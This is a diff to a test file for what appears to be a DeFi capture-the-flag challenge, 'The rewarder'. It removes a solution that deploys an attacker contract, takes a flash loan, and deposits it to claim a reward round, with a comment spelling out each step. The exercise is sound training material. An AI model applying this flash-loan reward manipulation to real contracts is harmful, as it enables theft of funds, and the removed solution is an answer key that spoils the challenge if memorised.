@@ -70,24 +70,6 @@ describe('[Challenge] The rewarder', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
-        await ethers.provider.send("evm_increaseTime", [5 * 24 * 60 * 60]); // 5 days
-        const attacker = await (await ethers.getContractFactory('RewarderAttacker', player)).deploy(flashLoanPool.address,
-            rewarderPool.address,
-            liquidityToken.address,
-            rewardToken.address);
-        await attacker.attack(TOKENS_IN_LENDER_POOL);
-        await attacker.withdraw();
-        /*
-        Explanation:
-        We wait 5 days for the next round of rewards.
-        We take a flash loan of ${TOKENS_IN_LENDER_POOL} DVT tokens.
-        We deposit that amount.
-        We claim the reward.
-        We withdraw.
-        We pay the loan.
-        We transfer the reward back to the player.
-        Very straight forward.
-        */
     });
 
     after(async function () {
